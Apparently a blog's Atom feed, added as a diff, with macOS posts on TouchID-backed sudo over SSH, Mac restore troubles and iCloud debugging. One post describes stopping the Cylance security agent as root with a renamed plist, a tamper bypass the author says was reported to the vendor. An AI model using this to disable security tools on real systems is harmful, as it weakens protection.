@@ -1,0 +1,2625 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"
+  xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <author>
+    <name>m4rkw</name>
+  </author>
+  <id>http://m4.rkw.io/blog/</id>
+  <title>m4.rkw.io</title>
+  <updated>2021-06-17T15:22:56+01:00</updated>
+  <entry>
+    <id>http://m4.rkw.io/blog/how-to-use-touchid-for-sudo-remotely-over-ssh.html</id>
+    <link href="http://m4.rkw.io/blog/how-to-use-touchid-for-sudo-remotely-over-ssh.html"/>
+    <summary>&lt;pre&gt;TouchID on the mac is really cool. It&amp;#39;s awesome being able to use it for sudo,
+but I thought it would be even more awesome if it could be used to authenticate
+sudo remotely over ssh.
+
+I&amp;#39;ve made this work using touch2sudo - &lt;a href=&quot;https://github.com/prbinu/touch2sudo&quot;&gt;https://github.com/prbinu/touch2sudo&lt;/a&gt;
+which is a simple binary that when executed will show a touchID authentication
+prompt and return 0 if the auth was successful and non-zero if not.
+
+I&amp;#39;ve created a simple nginx vhost that exposes a python cgi script. When
+executed this spawns touch2sudo and returns the status code to indicate if
+authentication was successful or not.
+
+I then create a persistent ssh connection to the remote server I want to use
+this with, reverse forwarding the local nginx instance to the remote machine.
+
+Then I wrote a simple PAM module which calls the endpoint in order to initiate
+the touchID authentication.
+
+## warning
+
+Please be aware this is just a proof-of-concept, it&amp;#39;s very rough around the
+edges and will likely have security issues. Please don&amp;#39;t use this for systems
+you care about unless you know what you&amp;#39;re doing. I am not liable for any issues
+that may arise from following these steps.
+
+Also note that when the nginx endpoint isn&amp;#39;t listening on the remote machine,
+any local user could throw up a tcp listener that just responds with &amp;quot;0&amp;quot; in
+order to bypass sudo authentication. If you want to use this securely you&amp;#39;ll
+need to do a bit more work.
+
+One possible way to mitigate this might be to use SSL on the nginx endpoint and
+verify the fingerprint of the SSL cert in the touchid shell script wrapper.
+
+## setup
+
+1) Install fcgiwrap from macports
+
+$ sudo port install fcgiwrap
+
+2) Give your local user permission to execute /opt/local/bin/spawn-fcgi as root
+without a password:
+
+/etc/sudoers.d/fcgiwrap
+
+--------------
+admin ALL=(ALL) NOPASSWD: /opt/local/bin/spawn-fcgi
+--------------
+
+3) Create ~/Library/LaunchAgents/org.macports.fcgiwrap.plist
+
+This has to be in your local user&amp;#39;s LaunchAgents path as it needs to be able to
+spawn the touchID gui popup on the user&amp;#39;s desktop.
+
+--------------
+&amp;lt;?xml version=&amp;#39;1.0&amp;#39; encoding=&amp;#39;UTF-8&amp;#39;?&amp;gt;
+&amp;lt;!DOCTYPE plist PUBLIC &amp;quot;-//Apple//DTD PLIST 1.0//EN&amp;quot;
+&amp;quot;&lt;a href=&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot; &amp;gt&quot;&gt;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot; &amp;gt&lt;/a&gt;;
+&amp;lt;plist version=&amp;#39;1.0&amp;#39;&amp;gt;
+&amp;lt;dict&amp;gt;
+&amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;&amp;lt;string&amp;gt;org.macports.fcgiwrap&amp;lt;/string&amp;gt;
+&amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
+&amp;lt;array&amp;gt;
+  &amp;lt;string&amp;gt;/usr/bin/sudo&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;/opt/local/bin/spawn-fcgi&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;-F&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;1&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;-P&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;/opt/local/var/run/fcgiwrap.pid&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;-s&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;/opt/local/var/run/fcgiwrap.socket&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;-U&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;nobody&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;-G&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;nobody&amp;lt;/string&amp;gt;
+  &amp;lt;string&amp;gt;/opt/local/sbin/fcgiwrap&amp;lt;/string&amp;gt;
+&amp;lt;/array&amp;gt;
+&amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt;&amp;lt;true/&amp;gt;
+&amp;lt;/dict&amp;gt;
+&amp;lt;/plist&amp;gt;
+--------------
+
+4) Spawn fcgiwrap
+
+$ launchctl load -w ~/Library/LaunchAgents/org.macports.fcgiwrap.plist
+
+5) Install nginx from macports
+
+/opt/local/etc/nginx/nginx.conf
+
+--------------
+worker\_processes  1;
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    include conf.d/*.conf;
+    include sites-enabled/*;
+
+    upstream fcgiwrap {
+      server unix:/opt/local/var/run/fcgiwrap.socket;
+    }
+}
+--------------
+
+6) Create /opt/local/etc/nginx/fastcgi_params
+
+--------------
+fastcgi_param  QUERY_STRING       $query_string;
+fastcgi_param  REQUEST_METHOD     $request_method;
+fastcgi_param  CONTENT_TYPE       $content_type;
+fastcgi_param  CONTENT_LENGTH     $content_length;
+
+fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
+fastcgi_param  REQUEST_URI        $request_uri;
+fastcgi_param  DOCUMENT_URI       $document_uri;
+fastcgi_param  DOCUMENT_ROOT      $document_root;
+fastcgi_param  SERVER_PROTOCOL    $server_protocol;
+fastcgi_param  REQUEST_SCHEME     $scheme;
+fastcgi_param  HTTPS              $https if_not_empty;
+
+fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
+fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
+
+fastcgi_param  REMOTE_ADDR        $remote_addr;
+fastcgi_param  REMOTE_PORT        $remote_port;
+fastcgi_param  SERVER_ADDR        $server_addr;
+fastcgi_param  SERVER_PORT        $server_port;
+fastcgi_param  SERVER_NAME        $server_name;
+--------------
+
+# PHP only, required if PHP was built with --enable-force-cgi-redirect
+fastcgi_param  REDIRECT_STATUS    200;
+
+7) Create the vhost config: /opt/local/etc/nginx/sites-enabled/auth.conf
+
+--------------
+server {
+  listen 61111 default_server;
+
+  root /var/www/auth/htdocs;
+  index index.py;
+
+  server_name auth;
+
+  rewrite ^/auth$ /auth.py;
+
+  location ~ \.py$ {
+    include /opt/local/etc/nginx/fastcgi_params;
+
+    fastcgi_param DOCUMENT_ROOT /var/www/auth/htdocs;
+    fastcgi_param SCRIPT_FILENAME /var/www/auth/htdocs$fastcgi_script_name;
+
+    fastcgi_pass fcgiwrap;
+    fastcgi_read_timeout 300s;
+  }
+}
+--------------
+
+8) Start nginx
+
+$ sudo launchctl load -w /Library/LaunchDaemons/org.macports.nginx.plist
+
+9) Grab the touch2sudo binary from here:
+
+&lt;a href=&quot;https://github.com/prbinu/touch2sudo&quot;&gt;https://github.com/prbinu/touch2sudo&lt;/a&gt;/releases/download/v0.1/touch2sudo-0.1.tgz
+
+copy it to:
+
+/usr/local/bin/touch2sudo
+
+10) Create the python CGI wrap at /var/www/auth/htdocs/auth.py
+
+--------------
+#!/usr/bin/env python3
+
+import os
+import sys
+
+KEY = &amp;#39;YOUR_KEY_HERE&amp;#39;
+
+if &amp;#39;HTTP_AUTH&amp;#39; not in os.environ or os.environ[&amp;#39;HTTP_AUTH&amp;#39;] != KEY:
+  sys.exit(0)
+
+rc = os.system(&amp;quot;/usr/bin/sudo -u admin /usr/local/bin/touch2sudo&amp;quot;)
+
+print(&amp;quot;Content-type: text/plain\n&amp;quot;)
+print(str(rc))
+--------------
+
+Be sure to replace the key with a random string of your own choosing.
+
+11) Test that the nginx auth endpoint works:
+
+$ curl -s -H &amp;#39;Auth: YOUR_KEY_HERE&amp;#39; &lt;a href=&quot;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&quot;&gt;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&lt;/a&gt;
+
+This should show a touchID prompt, and the output from curl should be 0 if you
+authenticate correctly with touchID. If this doesn&amp;#39;t work, check the logs and
+see why it isn&amp;#39;t working before proceeding.
+
+12) Create a new non-admin user on your mac to run the persistent ssh connection
+as. For example you could call the user &amp;quot;sshuser&amp;quot;. If you want to hide them from
+the macOS login window you can execute:
+
+$ sudo dscl . create /Users/sshuser IsHidden 0
+
+If you want to remove them from the FileVault authentication page on startup,
+run this:
+
+$ sudo fdesetup remove -user sshuser
+
+13) Create the same unprivileged user on your remote machine. I&amp;#39;ll assume you
+used the same username.
+
+14) (Optional) prevent the user on the remote machine from spawning a shell.
+This is for additional security. Add the below lines to your sshd config on the
+remote machine and restart sshd.
+
+--------------
+# tail -n3 /etc/ssh/sshd_config
+Match User sshuser
+  PermitTTY no
+  ForceCommand /bin/true
+--------------
+
+15) Become sshuser on your mac and generate an ssh key for them:
+
+$ sudo -Hu sshuser bash
+$ cd
+$ ssh-keygen
+
+16) Add the contents of /Users/sshuser/.ssh/id_rsa.pub on your mac to
+/home/sshuser/.ssh/authorized_keys on the remote machine
+
+17) Verify that the key authentication is working from sshuser on the mac to the
+remote machine.
+
+$ sudo -Hu mbssh bash
+$ cd
+$ ssh sshuser@REMOTE_MACHINE
+PTY allocation request failed on channel 0
+Connection to REMOTE_MACHINE closed.
+
+If you see &amp;quot;PTY allocation request failed&amp;quot; this means it&amp;#39;s working.
+
+18) Create a launchd config to launch and maintain the persistent ssh
+connection at: /Library/LaunchDaemons/com.sshuser.ssh.plist
+
+--------------
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE plist PUBLIC &amp;quot;-//Apple//DTD PLIST 1.0//EN&amp;quot; &amp;quot;&lt;a href=&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;&amp;gt&quot;&gt;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;&amp;gt&lt;/a&gt;;
+&amp;lt;plist version=&amp;quot;1.0&amp;quot;&amp;gt;
+&amp;lt;dict&amp;gt;
+    &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
+    &amp;lt;string&amp;gt;com.sshuser.ssh.plist&amp;lt;/string&amp;gt;
+    &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
+    &amp;lt;array&amp;gt;
+      &amp;lt;string&amp;gt;/usr/bin/ssh&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;-NT&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;-o ServerAliveInterval=60&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;-o ExitOnForwardFailure=yes&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;-i&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;/Users/sshuser/.ssh/id_rsa&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;-R 61111:localhost:61111&amp;lt;/string&amp;gt;
+      &amp;lt;string&amp;gt;sshuser@REMOTE_MACHINE&amp;lt;/string&amp;gt;
+    &amp;lt;/array&amp;gt;
+    &amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
+    &amp;lt;true/&amp;gt;
+    &amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt;
+    &amp;lt;true/&amp;gt;
+    &amp;lt;key&amp;gt;UserName&amp;lt;/key&amp;gt;
+    &amp;lt;string&amp;gt;sshuser&amp;lt;/string&amp;gt;
+&amp;lt;/dict&amp;gt;
+&amp;lt;/plist&amp;gt;
+--------------
+
+19) Start the launch service:
+
+$ sudo launchctl load -w /Library/LaunchDaemons/com.sshuser.ssh.plist
+
+20) Test that the touchID prompt comes up when you hit the nginx endpoint from
+the remote server:
+
+$ ssh REMOTE_SERVER
+$ curl -sH &amp;#39;Auth: YOUR_KEY_HERE&amp;#39; &lt;a href=&quot;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&quot;&gt;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&lt;/a&gt;
+
+You should get a touchID prompt on your mac. If not, investigate and resolve the
+issue before proceeding.
+
+21) Create a simple bash wrapper to invoke the touchid authentication:
+
+/usr/local/bin/touchid
+
+--------------
+#!/bin/bash
+/bin/netstat -nat |grep &amp;#39;:61111&amp;#39; 1&amp;gt;/dev/null
+if [ $? -eq 0 ] ; then
+  r=`/usr/bin/curl -s -H &amp;#39;Auth: YOUR_KEY_HERE&amp;#39; &lt;a href=&quot;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&quot;&gt;&lt;a href=&quot;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://localhost:61111/auth&quot;&gt;http://localhost:61111/auth&lt;/a&gt;&lt;/a&gt;&lt;/a&gt;`
+  if [ &amp;quot;$r&amp;quot; == &amp;quot;0&amp;quot; ] ; then
+    exit 0
+  else
+    exit 1
+  fi
+fi
+exit 1
+--------------
+
+This wrapper will first check that the :61111 socket is listening, if it isn&amp;#39;t
+there it will return a non-zero exit code allowing sudo to fall back to password
+authentication.
+
+Test that this works before proceeding.
+
+22) Clone my fork of simple-pam: &lt;a href=&quot;&lt;a href=&quot;https://github.com/m4rkw/simple-pam&quot;&gt;https://github.com/m4rkw/simple-pam&lt;/a&gt;&quot;&gt;&lt;a href=&quot;https://github.com/m4rkw/simple-pam&quot;&gt;https://github.com/m4rkw/simple-pam&lt;/a&gt;&lt;/a&gt;
+
+$ git clone &lt;a href=&quot;&lt;a href=&quot;https://github.com/m4rkw/simple-pam&quot;&gt;https://github.com/m4rkw/simple-pam&lt;/a&gt;&quot;&gt;&lt;a href=&quot;https://github.com/m4rkw/simple-pam&quot;&gt;https://github.com/m4rkw/simple-pam&lt;/a&gt;&lt;/a&gt;
+
+23) Compile and install the pam module
+
+$ sudo apt install libpam-dev
+$ cd simple-pam
+$ gcc -fPIC -fno-stack-protector -c src/mypam.c
+$ sudo ld -x --shared -o /lib/security/mypam.so mypam.o
+
+24) Add the auth sufficient line to the top of your /etc/pam.d/sudo file after
+the bangline:
+
+--------------
+#%PAM-1.0
+
+auth sufficient mypam.so
+--------------
+
+At this point it should work. You should be able to ssh to your remote machine,
+type &amp;quot;sudo bash&amp;quot; and authenticate the sudo escalation with touchID.
+
+How cool is that? :)&lt;/pre&gt;</summary>
+    <title>How to use touchID for sudo remotely over ssh</title>
+    <updated>2020-04-18T14:25:39+01:00</updated>
+    <dc:date>2020-04-18T14:25:39+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/2020-macbook-air-carbon-copy-cloner-vs-the-t2-chip.html</id>
+    <link href="http://m4.rkw.io/blog/2020-macbook-air-carbon-copy-cloner-vs-the-t2-chip.html"/>
+    <summary>&lt;pre&gt;I love Carbon Copy Cloner, it is an awesome piece of software. I frequently rave
+about it to anyone who&amp;#39;ll listen, it&amp;#39;s so useful.
+
+It does however seem to have been somewhat limited by the introduction of
+Apple&amp;#39;s new T2 security chip. I recently purchased one of the new 2020 Macbook
+Airs - a great computer and my first mac with the T2 chip.
+
+My usual process when I get a new mac is to transfer everything over from my old
+one using an external SSD and Carbon Copy Cloner. After plugging the drive in to
+the new computer I discovered it wouldn&amp;#39;t boot from it as the T2 chip has
+external device boot disabled by default. Not a major problem, it was simple
+enough to enable it.
+
+So I booted into my clone drive, opened CCC and created a restore task. I
+clicked go and then the unexpected happened - CCC said it couldn&amp;#39;t proceed
+because the source drive was FileVault encrypted but the destination wasn&amp;#39;t. I
+hadn&amp;#39;t seen this before, but the recommended workaround was to simply turn off
+FileVault on the clone drive. Not ideal but not the end of the world, so I did
+that and everything seemed to work.
+
+After an hour or so the sync was finished and I booted the mac normally, and all
+my stuff was there. It took around a day or two to sync all my data back down
+from iCloud, as is normally the case. When that was finally done I thought
+everything was good.. until I tried to set up ApplePay.
+
+&amp;quot;Apple Pay has been disabled because the security settings of this Mac were
+modified&amp;quot;.
+
+Interesting. Also vague, and not super helpful. I rebooted into recovery and
+checked the startup security utility - everything looked good, it was set to the
+maximum security level and boot from external devices was disabled. Rebooted but
+again, same error.
+
+I checked the log stream from the terminal and saw it was failing to initialise
+the ApplePay system with an error message that included the phrase &amp;quot;Kext check
+failed&amp;quot;. Interesting. I had a couple of 3rd party kexts loaded so I removed
+them, rebooted, but again got the same error. At this point I started wondering
+if this might be an artefact of having restored from a CCC clone, so I hopped
+onto a friendly irc channel to ask some mac nerds.
+
+I was immediately told that you should never restore a clone onto a T2 mac.
+Instead you have to always use the Migration Assistant or you&amp;#39;ll run into issues
+with the T2 chip just like I did. I was advised to start again with internet
+recovery so I made sure my clone drive was up to date, rebooted, erased the
+startup disk, rebooted again and launched internet recovery.
+
+At this point it was late in the evening and I figured this was going to be a
+time-consuming pain but not the end of the world. Unfortunately things didn&amp;#39;t
+quite go to plan. The initial download of the OS from internet recovery seemed
+to work, the machine rebooted and said 12mins remaining but then after a moment
+or two it suddenly bounced back into the GUI and said:
+
+------------
+macOS could not be installed on your computer
+
+An internal error has occurred. : (-69624)
+
+Quit the installer to restart your computer and try again.
+------------
+
+&lt;img src=&quot;https://m4.rkw.io/img/69624.jpg&quot; /&gt;
+
+This was very disheartening for a brand new machine. Hoping it was some kind of
+transient network issue I rebooted and ran through the process again. Same
+error. I tried removing my startup security password and ran it again, same
+error.
+
+I glanced at my clone drive, remembering it had a recovery partition, and
+thought maybe I could reinstall using that. First I&amp;#39;d have to enable booting
+from external devices, so I tried to open the startup security utility, only to
+find that it refused to do anything because it couldn&amp;#39;t authentiate me against
+an admin account on the system disk (which was now blank) and I&amp;#39;d removed my
+password. It seems that it might be worth setting a startup security password
+just to have a fallback authentication method for this scenario.
+
+At this point I did some googling, found a few people who&amp;#39;d run into the same
+issue, one of whom ending up returning his machine for a logic board replacement
+as a result. At this point I was feeling depressed, a 2-day old machine turned
+into a brick because Apple apparently couldn&amp;#39;t make a reliable recovery service.
+
+Finally as a last resort I went through a methodical sequence of steps:
+
+1) Powered off
+2) Reset the PRAM and NVRAM
+3) Booted back into internet recovery and erased the system disk
+4) Powered off, reset PRAM and NVRAM again
+5) Booted back into internet recovery and restarted the installer
+
+I don&amp;#39;t know if any of these steps made a difference or whether there was a
+transient issue that resolved itself but thankfully this 3rd time the installer
+worked and the machine was back into a usable state.
+
+After installation I plugged my clone drive in and used the Migration Assistant
+to restore my data. I was actually impressed at how well this worked - I&amp;#39;d
+always assumed a full-system clone with CCC would be a better experience but the
+Migration Assistant did really well and completed very quickly.
+
+I did run into a few minor issues with it:
+
+1) After it completed my first login attempt resulted in a perpetual spinner,
+but a simple reboot resolved it
+
+2) Some of my system settings were restored to defaults but that&amp;#39;s not really a
+major problem
+
+Other than those two minor glitches the system is exactly as it would have been
+if I&amp;#39;d restored from the clone, except that Apple Pay now works and it also
+didn&amp;#39;t re-download all my photos from iCloud.
+
+So a bumpy road but ultimately successful.
+
+I have since reached out to CCC support to ask them if they&amp;#39;d consider adding a
+warning to the application when attempting to restore a clone to a T2 mac.
+Hopefully if they do this it will prevent others from going through the same
+trouble. I can easily imagine many people restoring clones, noticing Apple Pay
+doesn&amp;#39;t work and not connecting the dots - likely leading to many hours on the
+phone to Apple Support.
+
+Much thanks to Branes and Cpuroast of ##apple for their help in resolving this!&lt;/pre&gt;</summary>
+    <title>2020 Macbook Air: Carbon Copy Cloner vs the T2 chip</title>
+    <updated>2020-04-18T11:53:16+01:00</updated>
+    <dc:date>2020-04-18T11:53:16+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cylance-local-protection-seems-a-bit-daft.html</id>
+    <link href="http://m4.rkw.io/blog/cylance-local-protection-seems-a-bit-daft.html"/>
+    <summary>&lt;pre&gt;On a mac if you set Cylance&amp;#39;s &amp;quot;local protection&amp;quot; to &amp;quot;system&amp;quot; it seems to
+disallow all filesystem access to the CylanceSvc service&amp;#39;s launchd plist file:
+
+/Library/LaunchDaemons/com.cylance.agent_service.plist
+
+This access is completely denied even to the root user. At first glance this
+would appear to prevent all users, including root, from stopping the service.
+
+However launchd does not look at the filename when processing one of these
+files. You can have one called foo.plist and if it&amp;#39;s Label key is set to the
+same as the Cylance one, eg &amp;quot;com.cylance.agent_service&amp;quot;, then it can be used to
+stop the Cylance service.
+
+So this local protection is fairly weak in terms of stopping the root user from
+disabling Cylance. Also weirdly if I use a separate plist file to stop the
+service when it&amp;#39;s in this mode, after starting it back up again the original
+plist is left accessible.
+
+Reported both of these issues to Cylance, they seemed to already be aware of the
+first one and just seemed to say it&amp;#39;s a limitation of the operating system.
+Presumably with SIP locking down all the system files there&amp;#39;s only so much they
+can do to interrupt things being done as root.&lt;/pre&gt;</summary>
+    <title>Cylance local protection seems a bit daft</title>
+    <updated>2019-07-25T19:14:56+01:00</updated>
+    <dc:date>2019-07-25T19:14:56+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/the-real-reason-your-icloud-drive-isnt-syncing.html</id>
+    <link href="http://m4.rkw.io/blog/the-real-reason-your-icloud-drive-isnt-syncing.html"/>
+    <summary>&lt;pre&gt;I recently had the logic board replaced in my 2017 Macbook Pro. I use the
+awesome Carbon Copy Cloner to keep an image of my system as a bootable backup
+which can then be easily restored when the machine is returned to me.
+
+This time however I had some issues with iCloud Drive. After restoring the
+backup I found it wasn&amp;#39;t syncing. I tried the usual troubleshooting steps: turn
+it off, reboot the machine, turn it back on again. Still wasn&amp;#39;t syncing, just
+sitting there with all my files and folders seemingly stuck in the state of
+&amp;quot;waiting to download&amp;quot;. I scoured the internet, lots of people with the same
+issue and no obvious solution. Curiously though some of the threads had people
+reporting that their stuff would just suddenly start syncing out of nowhere
+without them having done anything to prompt it.
+
+Well I have AppleCare so with a due sense of exhaustion and dread I gave them a
+call. We started a screen share session so they could see the problem. Their
+first suggestion was to try creating a new user account and seeing if that would
+sync. I took exception to this - I don&amp;#39;t need this to work on another account, I
+need it to work on *this* account. I hung up the call and decided to investigate
+myself.
+
+I knew from previous messing around with macOS that the main process involved in
+iCloud Drive syncing was bird. I decided to see if it was logging anything:
+
+
+
+
+
+
+
+
+$ log stream |egrep -i bird
+2019-07-09 18:11:09.546067+0100 0x5afcd    Activity    0x6c4a4              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+2019-07-09 18:11:10.672324+0100 0x5afcd    Activity    0x6c4a5              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+2019-07-09 18:11:11.626342+0100 0x5afcd    Activity    0x6c4a6              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+2019-07-09 18:11:12.629151+0100 0x5afcd    Activity    0x6c4a7              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+2019-07-09 18:11:13.496400+0100 0x64538    Activity    0x6c4a8              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+2019-07-09 18:11:14.429404+0100 0x5afcd    Activity    0x6c4a9              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
+
+Interesting. These log messages seem to indicate that it&amp;#39;s syncing something
+down, but what? My files don&amp;#39;t appear to be syncing at all. There&amp;#39;s no obvious
+activity in the Finder. Curious I had a look at what files the bird process had
+open:
+
+# lsof -p 1609
+COMMAND  PID  USER   FD      TYPE             DEVICE   SIZE/OFF    NODE NAME
+bird    1609 admin  cwd       DIR                1,4        832       2 /
+bird    1609 admin  txt       REG                1,4      26656 1400386 /System/Library/PrivateFrameworks/CloudDocsDaemon.framework/Versions/A/Support/bird
+bird    1609 admin  txt       REG                1,4      21024 3013734 /Library/Preferences/Logging/.plist-cache.hjohswfh
+bird    1609 admin  txt       REG                1,4   27154336 2775567 /usr/share/icu/icudt62l.dat
+bird    1609 admin  txt       REG                1,4      32768 3015531 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db-shm
+bird    1609 admin  txt       REG                1,4      32768 3082860 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-shm
+bird    1609 admin  txt       REG                1,4      32768 3015536 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db-shm
+bird    1609 admin  txt       REG                1,4      32768 3082865 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db-shm
+bird    1609 admin  txt       REG                1,4      65536 3083096 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db-shm
+bird    1609 admin  txt       REG                1,4     288952  897141 /Library/Application Support/CrashReporter/SubmitDiagInfo.domains
+bird    1609 admin  txt       REG                1,4     238448 2720071 /private/var/db/timezone/tz/2019a.1.0/icutz/icutz44l.dat
+bird    1609 admin  txt       REG                1,4    6270976 3079606 /private/var/folders/3b/xf71n9xx2jz2spvzcy9wc4fh0000gn/0/com.apple.LaunchServices-231-v2.csstore
+bird    1609 admin  txt       REG                1,4     973824 2745534 /usr/lib/dyld
+bird    1609 admin    0r      CHR                3,2        0t0     311 /dev/null
+bird    1609 admin    1u      CHR                3,2        0t0     311 /dev/null
+bird    1609 admin    2u      CHR                3,2        0t0     311 /dev/null
+bird    1609 admin    3r      DIR                1,4        192 3002924 /Users/admin/Library/Application Support/CloudDocs
+bird    1609 admin    4u      REG                1,4       4096 3015527 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db
+bird    1609 admin    5u      REG                1,4       4096 3082856 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db
+bird    1609 admin    6u      REG                1,4      32768 3015531 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db-shm
+bird    1609 admin    7u      REG                1,4     487424 3015532 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db
+bird    1609 admin    8u      REG                1,4    4095312 3082859 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-wal
+bird    1609 admin    9u      REG                1,4      32768 3015536 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db-shm
+bird    1609 admin   10u      REG                1,4       4096 3015527 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db
+bird    1609 admin   11u      REG                1,4      32768 3082860 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-shm
+bird    1609 admin   12u      REG                1,4       4096 3082861 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db
+bird    1609 admin   13u      REG                1,4    4853392 3082864 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db-wal
+bird    1609 admin   14u      REG                1,4      32768 3082865 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db-shm
+bird    1609 admin   15u      REG                1,4       4096 3082856 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db
+bird    1609 admin   16   NPOLICY
+bird    1609 admin   17r      REG                1,4     487424 3015532 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db
+bird    1609 admin   18r      REG                1,4       4096 3015527 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db
+bird    1609 admin   19u      REG                1,4    4095312 3082859 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-wal
+bird    1609 admin   20r      REG                1,4       4096 3082861 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db
+bird    1609 admin   21r      REG                1,4       4096 3082861 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db
+bird    1609 admin   22u    systm 0x455f0d0e6f39ca23        0t0         [ctl com.apple.netsrc id 8 unit 8]
+bird    1609 admin   23r      REG                1,4     487424 3015532 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db
+bird    1609 admin   24r      REG                1,4       4096 3015527 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db
+bird    1609 admin   25r      REG                1,4     535632 3015535 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/client.db-wal
